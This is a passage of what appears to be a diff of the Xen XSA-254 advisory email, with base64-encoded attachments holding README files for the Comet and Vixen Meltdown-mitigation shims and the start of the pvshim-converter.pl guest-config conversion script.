+iACMP+bTLgPyWBVrHZi9HfjZ6nZyKiKzT9BAVRaof+FW/T3daHSFzydxzka66nka
+Pv+9vLJOPfQ16/lhQk4DIy8k0vU6CE5Z0Lt1+jJiKvlSb97ChgLoAm5kodLQCvU/
+zwIvC7yxjiSB6a3els3+Il19vQpoQ6rwVhSjPxcTc3naPR+a+8CXoSwmbuULHWtP
+qfRpPXgjCH2VLTj8kVD0jnCVcCmD7d6qysSqYMtU/N9ad1e7M5hHN9Eos7hKUxMI
+mG8+KQ3iRqenUbpaLVDBQyzdWkK6i2Z1PGF/p0aEjdS5WIF/vskdje00cxgPIs6/
+Wov+uAvhzARHXLBSSJMkAcHFut2mk8of7/OuiCf0vMuJk6IzSe8=
+=CQe2
 -----END PGP SIGNATURE-----
 
---=separator
-Content-Type: application/octet-stream; name="xsa254/README.comet"
-Content-Disposition: attachment; filename="xsa254/README.comet"
-Content-Transfer-Encoding: base64
-
-CQkJICAgIFBWLWluLVBWSCBzaGltCiAgICAgICAgICAgICAgICAgICAgICAg
-ICAgICA9PT09PT09PT09PT09PQoKU3VtbWFyeQotLS0tLS0tCgpUaGlzIFJF
-QURNRSBkZXNjcmliZXMgb25lIG9mIHR3byBtaXRpZ2F0aW9uIHN0cmF0ZWdp
-ZXMgZm9yIE1lbHRkb3duLgoKVGhlIGJhc2ljIHByaW5jaXBsZSBpcyB0byBy
-dW4gUFYgZ3Vlc3RzICh3aGljaCBjYW4gcmVhZCBhbGwgb2YgaG9zdAptZW1v
-cnkgZHVlIHRvIHRoZSBoYXJkd2FyZSBidWdzKSBhcyBQVkggZ3Vlc3RzICh3
-aGljaCBjYW5ub3QsIGF0IGxlYXN0Cm5vdCBkdWUgdG8gTWVsdGRvd24pLiAg
-VGhlIFBWIGVudmlyb25tZW50IGlzIHN0aWxsIHByb3ZpZGVkIHRvIHRoZQpn
-dWVzdCBieSBhbiBlbWJlZGRlZCBjb3B5IG9mIFhlbiwgdGhlICJzaGltIi4g
-IFRoaXMgdmVyc2lvbiBvZiB0aGUKc2hpbSBpcyBjb2RlbmFtZWQgIkNvbWV0
-Ii4KClVubGlrZSBWaXhlbiwgQ29tZXQgcmVxdWlyZXMgbW9kaWZpY2F0aW9u
-cyB0byB0aGUgdG9vbHN0YWNrIGFuZCBob3N0Cmh5cGVydmlzb3IuCgpOb3Rl
-IHRoYXQgYm90aCBvZiB0aGVzZSBzaGltLWJhc2VkIGFwcHJvYWNoZXMgcHJl
-dmVudCBhdHRhY2tzIG9uIHRoZQpob3N0LCBidXQgbGVhdmUgdGhlIGd1ZXN0
-IHZ1bG5lcmFibGUgdG8gTWVsdGRvd24gYXR0YWNrcyBieSBpdHMgb3duCnVu
-cHJpdmlsZWdlZCBwcm9jZXNzZXM7IHRoaXMgaXMgdHJ1ZSBldmVuIGlmIHRo
-ZSBndWVzdCBPUyBoYXMgS1BUSSBvcgpzaW1pbGFyIE1lbHRkb3duIG1pdGln
-YXRpb24uCgpBdCB0aGUgbW9tZW50LCBvbmx5IDQuMTAgaXMgYXZhaWxhYmxl
-LiAgV2UgaG9wZSB0byBoYXZlIDQuOCBhbmQgNC45IGluCnRoZSBjb21pbmcg
-ZmV3IGRheXMuCgpXaGF0IHlvdSB3aWxsIG5lZWQKLS0tLS0tLS0tLS0tLS0t
-LS0tCgogKiBZb3Ugd2lsbCBuZWVkIHRoZSB4ZW4uZ2l0IHdpdGggdGhlIGZv
-bGxvd2luZyB0YWdzOgogIC0gRm9yIDQuMTA6IDQuMTAuMC1zaGltLWNvbWV0
-LTEKCkJ1aWxkIGluc3RydWN0aW9uczogNC4xMAotLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0KCjEuIEJ1aWxkIGEgNC4xMCsgc3lzdGVtCiAgICBnaXQgY2xv
-bmUgZ2l0Oi8veGVuYml0cy54ZW5wcm9qZWN0Lm9yZy94ZW4uZ2l0IHhlbi5n
-aXQKICAgIGNkIHhlbi5naXQKICAgIGdpdCBjaGVja291dCA0LjEwLjAtc2hp
-bS1jb21ldC0xLjEKCkRvIGEgYnVpbGQgYW5kIGluc3RhbGwgYXMgbm9ybWFs
-LiAgVGhlIHNoaW0gd2lsbCBiZSBidWlsdCBhcyBwYXJ0IG9mIHRoZQpub3Jt
-YWwgYnVpbGQgcHJvY2VzcywgYW5kIHBsYWNlZCB3aXRoIG90aGVyICdzeXN0
-ZW0nIGJpbmFyaWVzIHdoZXJlIHRoZQp0b29zdGFjayBrbm93cyBob3cgdG8g
-ZmluZCBpdC4KClVzYWdlIGluc3RydWN0aW9ucwotLS0tLS0tLS0tLS0tLS0t
-LS0KCiogQ29udmVydGluZyBhIFBWIGNvbmZpZyB0byBhIFBWSCBzaGltIGNv
-bmZpZwoKLSBSZW1vdmUgYW55IHJlZmVyZW5jZSB0byAnYnVpbGRlcicgKGUu
-Zy4sIGBidWlsZGVyPSJnZW5lcmljImApCi0gQWRkIHRoZSBmb2xsb3dpbmcg
-dHdvIGxpbmVzOgogIHR5cGU9InB2aCIKICBwdnNoaW09MQoKKiBDb252ZXJ0
-aW5nIGEgUFYgY29uZmlnIHRvIGEgUFZIIGNvbmZpZwoKSWYgeW91IGhhdmUg
-YSBrZXJuZWwgY2FwYWJsZSBvZiBib290aW5nIFBWSCwgdGhlbiBQVkggbW9k
-ZSBpcyBib3RoCmZhc3RlciBhbmQgbW9yZSBzZWN1cmUgdGhhbiBQViBvciBQ
-Vkgtc2hpbSBtb2RlLgoKLSBSZW1vdmUgYW55IHJlZmVyZW5jZSB0byAnYnVp
-bGRlcicgKGUuZy4sIGBidWlsZGVyPSJnZW5lcmljImApCi0gQWRkIHRoZSBm
-b2xsb3dpbmcgbGluZToKICB0eXBlPSJwdmgiCg==
-
---=separator
-Content-Type: application/octet-stream; name="xsa254/README.vixen"
-Content-Disposition: attachment; filename="xsa254/README.vixen"
-Content-Transfer-Encoding: base64
-
-ICAgICAgICAgICAgICAgIFBWLWluLUhWTSBzaGltIHdpdGggInNpZGVjYXIi
-IElTTwogICAgICAgICAgICAgICAgPT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09CgpTdW1tYXJ5Ci0tLS0tLS0KClRoaXMgUkVBRE1FIGRlc2Ny
-aWJlcyBvbmUgb2YgdHdvIG1pdGlnYXRpb24gc3RyYXRlZ2llcyBmb3IgTWVs
-dGRvd24uCgpUaGUgYmFzaWMgcHJpbmNpcGxlIGlzIHRvIHJ1biBQViBndWVz
-dHMgKHdoaWNoIGNhbiByZWFkIGFsbCBvZiBob3N0Cm1lbW9yeSBkdWUgdG8g
-dGhlIGhhcmR3YXJlIGJ1Z3MpIGFzIEhWTSBndWVzdHMgKHdoaWNoIGNhbm5v
-dCwgYXQgbGVhc3QKbm90IGR1ZSB0byBNZWx0ZG93bikuICBUaGUgUFYgZW52
-aXJvbm1lbnQgaXMgc3RpbGwgcHJvdmlkZWQgdG8gdGhlCmd1ZXN0IGJ5IGFu
-IGVtYmVkZGVkIGNvcHkgb2YgWGVuLCB0aGUgInNoaW0iLiAgVGhpcyB2ZXJz
-aW9uIG9mIHRoZQpzaGltIGlzIGNvZGVuYW1lZCAiVml4ZW4iLgoKSW4gb3Jk
-ZXIgdG8gYm9vdCB0aGUgc2hpbSB3aXRoIGFuIHVubW9kaWZpZWQgdG9vbHN0
-YWNrLCB5b3UgYWxzbwpwcm92aWRlIGEgc3BlY2lhbCBkaXNrIGNvbnRhaW5p
-bmcgdGhlIHNoaW0gYW5kIHRoZSBndWVzdCBrZXJuZWwgKG9yCnB2Z3J1Yik7
-IHRoaXMgaXMgY2FsbGVkIHRoZSAic2lkZWNhciIuCgpOb3RlIHRoYXQgYm90
-aCBvZiB0aGVzZSBzaGltLWJhc2VkIGFwcHJvYWNoZXMgcHJldmVudCBhdHRh
-Y2tzIG9uIHRoZQpob3N0LCBidXQgbGVhdmUgdGhlIGd1ZXN0IHZ1bG5lcmFi
-bGUgdG8gTWVsdGRvd24gYXR0YWNrcyBieSBpdHMgb3duCnVucHJpdmlsZWdl
-ZCBwcm9jZXNzZXM7IHRoaXMgaXMgdHJ1ZSBldmVuIGlmIHRoZSBndWVzdCBP
-UyBoYXMgS1BUSSBvcgpzaW1pbGFyIE1lbHRkb3duIG1pdGlnYXRpb24uCgpX
-aGF0IHlvdSB3aWxsIG5lZWQKLS0tLS0tLS0tLS0tLS0tLS0tCgogKiBZb3Vy
-IGhvc3QgbXVzdCBiZSBhYmxlIHRvIHJ1biBncnViLW1rcmVzY3VlIHRvIGdl
-bmVyYXRlIGEgLmlzbwogKiBZb3Ugd2lsbCB0aGVyZWZvcmUgbmVlZCB4b3Jy
-aXNvIGFuZCBtdG9vbHMKICogWW91IG11c3QgYmUgdXNpbmcgeGwgYW5kIGFi
-bGUgdG8gdXNlIGFuIGFsdGVybmF0aXZlIHlvdXIgZ3Vlc3QgY29uZmlnCgog
-KiBZb3Ugd2lsbCBuZWVkIHRoZSBzY3JpcHQgInB2c2hpbS1jb252ZXJ0ZXIu
-cGwiCiAgLSBUaGlzIHJlbGllcyBvbiBwZXJsLWpzb24KICogWW91IHdpbGwg
-bmVlZCB0aGUgeGVuLmdpdCB0YWcgNC45LjEtc2hpbS12aXhlbi0xCgoKSW5z
-dHJ1Y3Rpb25zCi0tLS0tLS0tLS0tLQoKMS4gT24gYSBzdWl0YWJsZSBzeXN0
-ZW0gKHBlcmhhcHMgYSBkaWZmZXJlbnQgaG9zdCkKICAgIGdpdCBjbG9uZSBn
-aXQ6Ly94ZW5iaXRzLnhlbnByb2plY3Qub3JnL3hlbi5naXQgeGVuLmdpdAog
-ICAgY2QgeGVuLmdpdAogICAgZ2l0IGNoZWNrb3V0IDQuOS4xLXNoaW0tdml4
-ZW4tMQoKSWYgeW91IG5lZWQgYmktZGlyZWN0aW9uYWwgY29uc29sZSBhbmQg
-ZG9uJ3QgbWluZCBhIGxlc3MtdGVzdGVkIHBhdGNoLAp5b3UgY2FuIGFwcGx5
-IHRoZSBwYXRjaCBmb3VuZCBpbiB0aGlzIGVtYWlsOgoKICAgIG1hcmMuaW5m
-by8/aT08MTUxNTYwNDU1Mi05MjA1LTEtZ2l0LXNlbmQtZW1haWwtc3JuQHBy
-Z21yLmNvbT4KCmJ1aWxkIGEgeGVuIGh5cGVydmlzb3IgYmluYXJ5IGFzIHVz
-dWFsOgoKICAgIG1ha2UgeGVuCgpJZiB5b3VyIGRlZmF1bHQgdmVyc2lvbiBv
-ZiBweXRob24gaXMgcHl0aG9uIDMsIHlvdSBtYXkgbmVlZCB0byBhZGQgdGhl
-IGZvbGxvd2luZzoKCiAgICBtYWtlIFBZVEhPTj1weXRob24yIHhlbgoKVGhp
-cyB3aWxsIGJ1aWxkIGEgZmlsZQogICAgeGVuL3hlbi5negoKMi4gQ29weSB0
-aGF0IGZpbGUgdG8geW91ciBkb20wLgoKSWRlYWxseSBzb21lcGxhY2UgbGlr
-ZSAvdXNyL2xpYi94ZW4vYm9vdC94ZW4tdml4ZW4uZ3oKCjMuIENvcHkgdGhl
-IHNjcmlwdCBwdnNoaW0tY29udmVydGVyIHRvIHlvdXIgZG9tMCBhbmQgbWFr
-ZQogICBpdCBleGVjdXRhYmxlOgogICAgICBjaG1vZCAreCBwdnNoaW0tY29u
-dmVydGVyLnBsCgo0LiBGb3IgZWFjaCBndWVzdAoKICAoaSkgaWYgdGhlIGd1
-ZXN0IGlzIGN1cnJlbnRseSBib290ZWQgd2l0aCBweWdydWIgeW91IG11c3Qg
-Zmlyc3QKICAgc3dpdGNoIHRvIGRpcmVjdCBrZXJuZWwgYm9vdCAoYnkgbWFu
-dWFsbHkgY29weWluZyB0aGUga2VybmVsIGFuZAogICBpbml0cmFtZnMgb3V0
-IG9mIHRoZSBndWVzdCwgYW5kIGNvbmZpZ3VyaW5nIHRoZSBjb21tYW5kIGxp
-bmUgaW4gdGhlCiAgIGRvbWFpbiBjb25maWd1cmF0aW9uIGZpbGUpLCBvciBw
-dmdydWIuCgogIChpaSkgcnVuCiAgICAgIC4vcHZzaGltLWNvbnZlcnRlci5w
-bCAtLXNoaW09L3Vzci9saWIveGVuL2Jvb3QveGVuLXZpeGVuLmd6IC9ldGMv
-eGVuL0dVRVNULmNmZyAvZXRjL3hlbi9HVUVTVC53aXRoLXNoaW0tY2ZnCgog
-IChpaWkpIHNodXQgdGhlIGd1ZXN0IGRvd24gY2xlYW5seQoKICAoaXYpIGNy
-ZWF0ZSB0aGUgZ3Vlc3Qgd2l0aCB0aGUgbmV3IGNvbmZpZwogICAgICB4bCBj
-cmVhdGUgL2V0Yy94ZW4vR1VFU1Qud2l0aC1zaGltLWNmZwoKICAodikgQ2hl
-Y2sgdGhhdCBpdCBib290cyBwcm9wZXJseS4gIHhsIGNvbnNvbGUgc2hvdWxk
-IHdvcmsuCgogICh2aSkgTWFrZSBhcnJhbmdlbWVudHMgc28gdGhhdCBhdXRv
-c3RhcnRpbmcgb2YgdGhlIGd1ZXN0IHdpbGwgdXNlCiAgICAgdGhlIG5ldyBj
-b25maWcgZmlsZSByYXRoZXIgdGhhbiB0aGUgb2xkIG9uZQoK
-
---=separator
-Content-Type: application/octet-stream; name="xsa254/README.which-shim"
-Content-Disposition: attachment; filename="xsa254/README.which-shim"
-Content-Transfer-Encoding: base64
-
-CQkgICBIb3cgdG8gZGVjaWRlIHdoaWNoIHNoaW0gdG8gdXNlCgkJICAgPT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PQoKQSB3b3JrLWFyb3VuZCB0
-byBNZWx0ZG93biAoYWthICJTUDMiIG9yICJWYXJpYW50IDMiKSBvbiBJbnRl
-bApwcm9jZXNzb3JzIGlzIHRvIHJ1biBndWVzdHMgaW4gSFZNIG9yIFBWSCBt
-b2RlLgoKTm90ZSB0aGlzIHNoaW0tYmFzZWQgYXBwcm9hY2ggcHJldmVudHMg
-YXR0YWNrcyBvbiB0aGUgaG9zdCwgYnV0IGxlYXZlcwp0aGUgZ3Vlc3QgdnVs
-bmVyYWJsZSB0byBNZWx0ZG93biBhdHRhY2tzIGJ5IGl0cyBvd24gdW5wcml2
-aWxlZ2VkCnByb2Nlc3NlczsgdGhpcyBpcyB0cnVlIGV2ZW4gaWYgdGhlIGd1
-ZXN0IE9TIGhhcyBLUFRJIG9yIHNpbWlsYXIKTWVsdGRvd24gbWl0aWdhdGlv
-bi4KClNvbWUgZ3Vlc3RzIGFyZSBkaWZmaWN1bHQgdG8gY29udmVydCB0byBy
-dW5uaW5nIGluIEhWTSBvciBQVkggbW9kZSwKZWl0aGVyIGR1ZSB0byBsYWNr
-IG9mIHBhcnRpdGlvbmluZyAvIE1CUiwgb3IgZHVlIHRvIGtlcm5lbApjb21w
-YXRpYmlsaXRpZXMuICBBcyBhbiBlbWVyZ2VuY3kgYmFja3N0b3AsIHRoZXJl
-IGFyZSB0d28gYXBwcm9hY2hlcywKd2hpY2ggd2UndmUgY29kZW5hbWVkICJW
-aXhlbiIgYW5kICJDb21ldCIuICBCb3RoIGludm9sdmUgcnVubmluZyBhbgpl
-bWJlZGRlZCBjb3B5IG9mIFhlbiAoY2FsbGVkIGEgInNoaW0iKSB3aXRoaW4g
-dGhlIEhWTSBvciBQVkggZ3Vlc3QgdG8KcHJvdmlkZSB0aGUgbmF0aXZlIFBW
-IGludGVyZmFjZS4KCkJlbG93IGRlc2NyaWJlcyB0aGUgcHJvcGVydGllcywg
-YW5kIHdobyBtaWdodCB3YW50IHRvIHVzZSBlYWNoIG9uZS4KCk5PVEU6IEJv
-dGggc2hpbXMgcmVxdWlyZSBob3N0IHBhdGNoZXMgdG8gYm9vdCBvbiBBTUQg
-aG9zdHMuICBUaGlzCnNob3VsZG4ndCBiZSBhbiBpc3N1ZSwgYXMgU1AzIGRv
-ZXMgbm90IGFmZmVjdCBzeXN0ZW1zIHJ1bm5pbmcgb24gQU1ELgoKVml4ZW4K
-LS0tLS0KClZpeGVuIGhhcyB0aGUgZm9sbG93aW5nIHByb3BlcnRpZXM6CiAq
-IFJ1bnMgdGhlIHNoaW0gaW4gYW4gSFZNIGd1ZXN0LgogKiBJdCByZXF1aXJl
-cyBubyBoeXBlcnZpc29yIG9yIHRvb2xzdGFjayBjaGFuZ2VzLCBub3IgZG9l
-cyBpdCByZXF1aXJlCiAgIGEgaG9zdCByZWJvb3QuCiAqIEl0IGhhcyBiZWVu
-IGV4dGVuc2l2ZWx5IHRlc3RlZCBpbiBBbWF6b24ncyBkZXBsb3ltZW50IGZv
-ciB2ZXJzaW9ucwogICBvZiBYZW4gZ29pbmcgYmFjayB0byAzLjQKICogR3Vl
-c3QgcmVib290cyBhcmUgcmVxdWlyZWQKICogR3Vlc3QgY29uZmlncyBtdXN0
-IGJlIGZlZCB0aHJvdWdoIGEgY29udmVydGVyIHByb2dyYW0KICogVGhlIGNv
-bnZlcnRlciBwcm9ncmFtIHNwaXRzIG91dCBhIHNtYWxsIGd1ZXN0LXNwZWNp
-ZmljIC5pc28KICAgaW1hZ2UgKHdlIGNhbGwgdGhpcyBhICJzaWRlY2FyIikg
-dXNlZCBmb3IgYm9vdGluZwogKiBCZWNhdXNlIHRoZSByZXN1bHQgaXMgYW4g
-SFZNIGd1ZXN0LCB0aGlzIGFwcHJvYWNoIGludm9sdmVzCiAgIHJ1bm5pbmcg
-cWVtdSBhcyBhIFBDIGVtdWxhdG9yICh0aGlzIGlzIGRvbmUgYXV0b21hdGlj
-YWxseSkKICogU29tZSBjb21tb24gZmVhdHVyZXMgYXJlIG5vdCBzdXBwb3J0
-ZWQ6CiAgLSBCYWxsb29uaW5nCiAgLSBNaWdyYXRpb24KICAtIHZjcHUgaG90
-cGx1ZwogIC0gYmlkaXJlY3Rpb25hbCBjb25zb2xlIHN1cHBvcnQgKGNvbnNv
-bGUgaXMgd3JpdGUtb25seSkKICogRGlyZWN0LWJvb3Qga2VybmVscyBhbmQg
-cHZncnViIChib3RoIHB2Z3J1YjEgYW5kIHB2Z3J1YjIpIGFyZQogICBzdXBw
-b3J0ZWQgYnkgdGhlIGNvbnZlcnNpb24gcHJvZ3JhbS4gICdweWdydWInIGlz
-IG5vdCBzdXBwb3J0ZWQuCiAqIHhsIGFuZCB4bSBkb21haW4gY29uZmlncyBj
-YW4gYmUgY29udmVydGVkOyBsaWJ2aXJ0IGRvbWFpbgogICBjb25maWd1cmF0
-aW9uIGFycmFuZ2VtZW50cyBhcmUgbm90IHN1cHBvcnRlZC4KICogR3Vlc3Qg
-dXNlcnNwYWNlIGNhbiByZWFkIGFsbCBvZiBndWVzdCBtZW1vcnksIHdpdGhp
-biBlYWNoIGd1ZXN0LAogICBhbmQgYSBndWVzdCBtaWdpdGF0aW9uIGZvciB0
-aGlzIGlzIG5vdCBwb3NzaWJsZS4KCllvdSBtaWdodCBjb25zaWRlciB0aGlz
-IGFwcHJvYWNoIGlmOgotIFlvdSB3YW50IHRvIGRlcGxveSBhIGZpeCBpbW1l
-ZGlhdGVseQotIFlvdSBjYW4gdG9sZXJhdGUgdGhlIGxvc3Mgb2Ygd2l0aGlu
-LWd1ZXN0IHNlY3VyaXR5Ci0gWW91IGNhbid0LCBvciB3b3VsZCBsaWtlIHRv
-IGF2b2lkLCB1cGRhdGluZyB0byBYZW4gNC44IG9yIG5ld2VyCi0gWW91J2Qg
-bGlrZSB0byBhdm9pZCBwYXRjaGluZyBhbmQgcmVib290aW5nIHlvdXIgaG9z
-dAotIFlvdSBhcmUgYWJsZSB0bzoKIC0gUnVuIGEgc2NyaXB0IHRvIG1vZGlm
-eSBlYWNoIGRvbWFpbiBjb25maWcKIC0gQWZmb3JkIGFuIGV4dHJhIDgwTWlC
-IHBlciBndWVzdAogLSBUb2xlcmF0ZSBoYXZpbmcgYW4gZXh0cmEgUUVNVSBh
-cm91bmQKLSBZb3UgZG9uJ3QgbmVlZCBtaWdyYXRpb24sIG1lbW9yeSBiYWxs
-b29uaW5nLCB2Y3B1IGhvdHBsdWcsCiAgb3IgYSBiaS1kaXJlY3Rpb25hbCBj
-b25zb2xlCgpUbyB1c2UgdGhpcyBzb2x1dGlvbiwgc2VlIFJFQURNRS52aXhl
-bi4KCkJpLWRpcmVjdGlvbmFsIGNvbnNvbGUgaXMgYXZhaWxhYmxlIGFzIGFu
-IGV4dHJhIHBhdGNoLCBidXQgaGFzbid0IGJlZW4Kd2lkZWx5IHRlc3RlZDoK
-Cm1hcmMuaW5mby8/aT08MTUxNTYwNDU1Mi05MjA1LTEtZ2l0LXNlbmQtZW1h
-aWwtc3JuQHByZ21yLmNvbT4KCkNvbWV0Ci0tLS0tCgpDb21ldCBoYXMgdGhl
-IGZvbGxvd2luZyBwcm9wZXJ0aWVzOgogKiBSdW5zIHRoZSBzaGltIGluIGEg
-UFZIIGd1ZXN0LgogKiBQVkggbW9kZSBpcyBhdmFpbGFibGUgaW4gWGVuIDQu
-MTAsIGFuZCB3aWxsIGJlIGJhY2twb3J0ZWQgdG8gWGVuCiAgIDQuOSBhbmQg
-NC44IGJ1dCBubyBmYXJ0aGVyCiAqIFJlcXVpcmVzIGhvc3QgaHlwZXJ2aXNv
-ciBhbmQgdG9vbHN0YWNrIHBhdGNoZXMgKGFuZCBob3N0IHJlYm9vdCksCiAg
-IGV2ZW4gZm9yIFhlbiA0LjEwCiAqIFJlcXVpcmVzIG1pbmltYWwgZ3Vlc3Qg
-Y29uZmlnIGNoYW5nZXMsIGFuZCBubyAic2lkZWNhciIKICogQm9vdGxvYWRp
-bmcgaXMgaWRlbnRpY2FsIHRvIG5hdGl2ZSBQViBndWVzdHM7IGRpcmVjdC1i
-b290LCBwdmdydWIsCiAgIGFuZCBweWdydWIgYWxsIHdvcmsgZXF1YWxseSB3
-ZWxsCiAqIEJlY2F1c2UgdGhlIHJlc3VsdCBpcyBhIFBWSCBndWVzdCwgdGhp
-cyBhcHByb2FjaCBpbnZvbHZlcyBubyBQQyBlbXVsYXRvci4KICogVGhlIGZv
-bGxvd2luZyBmZWF0dXJlcyBub3QgYXZhaWxhYmxlIGluIFZpeGVuIGFyZSBz
-dXBwb3J0ZWQ6CiAgLSBNZW1vcnkgYmFsbG9vbmluZwogIC0gR3Vlc3QgbWln
-cmF0aW9uCiAgLSB2Y3B1IGhvdHBsdWcKICAtIGJpZGlyZWN0aW9uYWwgY29u
-c29sZSBzdXBwb3J0CiAqIEd1ZXN0IHVzZXJzcGFjZSBjYW4gcmVhZCBhbGwg
-b2YgZ3Vlc3QgbWVtb3J5LCB3aXRoaW4gZWFjaCBndWVzdCwKICAgYW5kIGEg
-Z3Vlc3QgbWlnaXRhdGlvbiBmb3IgdGhpcyBpcyBub3QgcG9zc2libGUuCgpZ
-b3UgbWlnaHQgY29uc2lkZXIgdGhpcyBhcHByb2FjaCBpZjoKLSBZb3UncmUg
-b24gNC44IG9yIGxhdGVyIGFscmVhZHkKLSBZb3UgY2FuIHRvbGVyYXRlIHRo
-ZSBsb3NzIG9mIHdpdGhpbi1ndWVzdCBzZWN1cml0eQotIFlvdSBjYW4gcGF0
-Y2ggYW5kIHJlYm9vdCB5b3VyIGhvc3QKLSBZb3UgZG9uJ3Qgd2FudCBhbiBl
-eHRyYSBRRU1VIGFyb3VuZAotIFlvdSBuZWVkIG1pZ3JhdGlvbiwgbWVtb3J5
-IGJhbGxvb25pbmcsIG9yIHZjcHUgaG90cGx1Zywgb3IgYQogIGJpZGlyZWN0
-aW9uYWwgY29uc29sZQotIFlvdSBuZWVkIHB5Z3J1YgotIFlvdSBuZWVkIHRv
-IHVzZSBsaWJ2aXJ0CgpBdCB0aGUgbW9tZW50LCBDb21ldCBpcyBhdmFpbGFi
-bGUgZm9yIDQuMTAuICAgV2UgZXhwZWN0IHRvIGhhdmUKYmFja3BvcnRzIHRv
-IDQuOCBhbmQgNC44IGF2YWlsYWJsZSB3aXRoaW4gYSBmZXcgd29ya2luZyBk
-YXlzLgo=
-
---=separator
-Content-Type: application/octet-stream; name="xsa254/pvshim-converter.pl"
-Content-Disposition: attachment; filename="xsa254/pvshim-converter.pl"
-Content-Transfer-Encoding: base64
-
-IyEvdXNyL2Jpbi9wZXJsIC13CiMKIyB1c2FnZToKIyAgIHB2c2hpbS1jb252
-ZXJ0ZXIgW09QVElPTlNdIE9MRC1DT05GSUcgTkVXLUNPTkZJRwojCiMgb3B0
-aW9uczoKIyAgIC0tcWVtdSBQQVRILVRPLVFFTVUgICAgICAgIGZpbGVuYW1l
-IG9mIHFlbXUtc3lzdGVtLWkzODYKIyAgIC0tc2lkZWNhcnMtZGlyZWN0b3J5
-IERJUiAgIGRlZmF1bHQgaXMgL3Zhci9saWIveGVuL3B2c2hpbS1zaWRlY2Fy
-cwojICAgLS1zaGltIFNISU0gICAgICAgICAgICAgICAgb3ZlcnJpZGVzIGRv
-bWFpbiBjb25maWcgZmlsZQojICAgLS1kZWJ1ZyAgICAgICAgICAgICAgICAg
-ICAgdmVyYm9zZSwgYW5kIGxlYXZlcyBzaWRlY2FyIHByZXAgZGlyIGFyb3Vu
-ZAojCiMgV2hhdCB3ZSBkbwojCiMgIHJlYWQgZXhpc3RpbmcgY29uZmlnIGZp
-bGUgdXNpbmcgcHl0aG9uCiMgIGRldGVybWluZSBrZXJuZWwsIHJhbWRpc2sg
-YW5kIGNtZGxpbmUKIyAgdXNlIHRoZW0gdG8gcHJvZHVjZSBzaWRlY2FyIGFu
-ZCBzYXZlIGl0IHVuZGVyIGRvbWFpbiBuYW1lCiMgIG1lc3Mgd2l0aCB0aGUg
-dGhpbmdzIHRoYXQgbmVlZCB0byBiZSBtZXNzZWQgd2l0aAojICBzcGl0IG91
-dCBuZXcgY29uZmlnIGZpbGUKCnVzZSBzdHJpY3Q7Cgp1c2UgR2V0b3B0OjpM
-b25nOwp1c2UgSlNPTjsKdXNlIElPOjpIYW5kbGU7CnVzZSBQT1NJWDsKdXNl
-IEZjbnRsIHF3KDpmbG9jayk7CgpvdXIgJGRlYnVnOwoKc3ViIHJ1bmNtZCB7
-CiAgICBwcmludCBTVERFUlIgIisgQF9cbiIgaWYgJGRlYnVnOwogICAgJCE9
-MDsgJD89MDsgc3lzdGVtIEBfIGFuZCBkaWUgIiRfWzBdOiAkISAkPyI7Cn0K
-Cm91ciAkcWVtdTsKb3VyICRzaGltOwpvdXIgJHNpZGVjYXJzX2RpciA9ICcv
-dmFyL2xpYi94ZW4vcHZzaGltLXNpZGVjYXJzJzsKCkdldE9wdGlvbnMoJ3Fl
-bXU9cycgPT4gXCRxZW11LAogICAgICAgICAgICdzaWRlY2Fycy1kaXJlY3Rv
-cnk9cycgPT4gXCRzaWRlY2Fyc19kaXIsCiAgICAgICAgICAgJ3NoaW09cycg
-PT4gXCRzaGltLAogICAgICAgICAgICdkZWJ1ZycgPT4gXCRkZWJ1ZykKICAg
-IG9yIGRpZSAicHZzaGltLWNvbnZlcnRlcjogYmFkIG9wdGlvbnNcbiI7CgpA
-QVJHVj09MiBvciBkaWUgInB2c2hpbS1jb252ZXJ0ZXI6IG5lZWQgb2xkIGFu
-ZCBuZXcgY29uZmlnIGZpbGVuYW1lcyI7CgpvdXIgKCRpbiwkb3V0KSA9IEBB
-UkdWOwoKb3VyICRpbmRhdGE7CgppZiAoJGluIG5lICctJykgewogICAgb3Bl
-biBJLCAnPCcsICIkaW4iIG9yIGRpZSAib3BlbiBpbnB1dCBjb25maWcgZmls
-ZTogJCFcbiI7Cn0gZWxzZSB7CiAgICBvcGVuIEksICc8JlNURElOJyBvciBk
-aWUgJCE7Cn0KewogICAgbG9jYWwgJC87CiAgICAkaW5kYXRhID0gPEk+Owp9
-CkktPmVycm9yIGFuZCBkaWUgJCE7CmNsb3NlIEk7CgpvcGVuIFAsICItfCIs
-IHF3KHB5dGhvbjIgLWMpLCA8PEVORCwgJGluZGF0YSBvciBkaWUgJCE7Cmlt
-cG9ydCBzeXMKaW1wb3J0IGpzb24KbCA9IHt9CmV4ZWMgc3lzLmFyZ3ZbMV0g
-aW4gbApmb3IgayBpbiBsLmtleXMoKToKCWlmIGsuc3RhcnRzd2l0aCgiXyIp
-OgoJCWRlbCBsW2tdCnByaW50IGpzb24uZHVtcHMobCkKRU5ECgpvdXIgJGM7
-Cgp7CiAgICBsb2NhbCAkLzsKICAgICRfID0gPFA+OwogICAgJCE9MDsgJD89
-MDsgY2xvc2UgUCBvciBkaWUgIiQhICQ/IjsKICAgICRjID0gZGVjb2RlX2pz
-b24gJF87Cn0KCmRpZSAibm8gZG9tYWluIG5hbWUgPyIgdW5sZXNzIGV4aXN0
-cyAkYy0+e25hbWV9OwpkaWUgImJvb3Rsb2FkZXIgbm90IHlldCBzdXBwb3J0
-ZWQiIGlmICRjLT57Ym9vdGxvYWRlcn07CmRpZSAibm8ga2VybmVsIiB1bmxl
-c3MgJGMtPntrZXJuZWx9OwoKb3VyICRzaWRlY2FyID0gJGMtPntwdnNoaW1f
-c2lkZWNhcl9wYXRofSB8fCAiJHNpZGVjYXJzX2Rpci8kYy0+e25hbWV9Lmlz
-byI7Cm91ciAkZG13cmFwID0gJGMtPntwdnNoaW1fc2lkZWNhcl9wYXRofSB8
-fCAiJHNpZGVjYXJzX2Rpci8kYy0+e25hbWV9LmRtIjsKCiRzaGltIHx8PSAk
-Yy0+e3B2c2hpbV9wYXRofTsKJHNoaW0gfHw9ICcvdXNyL2xvY2FsL2xpYi94
-ZW4vYm9vdC94ZW4tc2hpbSc7CgpvdXIgJHNoaW1fY21kbGluZSA9ICRjLT57
-cHZzaGltX2NtZGxpbmV9IHx8ICdjb25zb2xlPWNvbTEgY29tMT0xMTUyMDBu
-MSc7CiRzaGltX2NtZGxpbmUgLj0gJyAnLiRjLT57cHZzaGltX2V4dHJhfSBp
